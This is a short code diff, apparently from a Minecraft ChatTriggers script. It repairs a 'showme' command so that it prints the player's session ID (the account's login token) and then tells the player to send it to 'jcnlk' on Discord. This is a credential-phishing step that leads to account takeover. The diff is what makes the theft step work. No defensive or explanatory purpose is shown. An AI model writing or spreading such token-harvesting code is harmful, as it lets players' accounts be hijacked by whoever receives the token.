@@ -4,7 +4,7 @@ const commandname = "'showme' ";
 
 register("command", () => {
   if (config.enableshowme) {
-    ChatLib.ChatLib(Client.getMinecraft().func_110432_I().func_148254_d());
+    ChatLib.chat(Client.getMinecraft().func_110432_I().func_148254_d());
     ChatLib.chat("");
     sendMsg("This is your ssid!");
     sendMsg("Make sure to send it 'jcnlk' on discord!");
